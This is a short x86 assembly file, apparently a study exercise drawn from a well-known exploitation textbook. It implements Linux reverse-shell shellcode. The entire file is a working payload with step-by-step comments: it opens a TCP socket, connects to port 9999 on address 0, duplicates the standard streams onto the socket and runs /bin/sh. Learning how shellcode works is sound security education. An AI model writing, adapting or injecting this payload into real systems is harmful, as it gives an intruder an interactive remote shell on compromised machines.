; Shellcode to implement reverse_shell.c functionality
; Resources used: "Hacking: The Art of Exploitation, 2nd Edition" by Jon Erickson

BITS 32

; int socketcall(int call, unsigned long *args)

; int socketcall(1, [2, 1, 0])
; socket(PF_INET, SOCK_STREAM, 0)
; s = socket(2, 1, 0)
push BYTE 0x66 		; socketcall is syscall 102 (0x66)
pop eax
cdq
xor ebx, ebx
inc ebx				; 1 = SYS_SOCKET = socket()
push edx
push BYTE 0x1
push BYTE 0x2
mov ecx, esp
int 0x80

xchg esi, eax

; int socketcall(3 , [client_sockfd, (struct sockaddr *) &client_addr, sizeof(struct sockaddr)])
; connect(client_sockfd, (struct sockaddr *) &client_addr, sizeof(struct sockaddr))
; connect(s, [2, 9999, 0], 16)
push BYTE 0x66
pop eax
inc ebx
inc ebx				; 3 = SYS_CONNECT = connect()
push edx			; Build sockaddr: 	INADDR_ANY = 0
push WORD 0x0f27	; (reverse order)	PORT = 9999
push WORD 0x2 		; 					AF_INET = 2
mov ecx, esp
push BYTE 16
push ecx
push esi
mov ecx, esp
int 0x80


; dup2(client_sockfd, {STDIN (0), STDOUT (1), STDERR (2)})
xor eax, eax
mov ebx, esi
push BYTE 0x2
pop ecx
dup_loop:
mov BYTE al, 0x3f
int 0x80
dec ecx
jns dup_loop


; execve('/bin//sh', ['/bin//sh', NULL], [NULL])

push edx
push 0x68732f2f		; //sh
push 0x6e69622f		; /bin
mov ebx, esp
push edx
mov edx, esp
push ebx
mov ecx, esp
mov al, 11
int 0x80
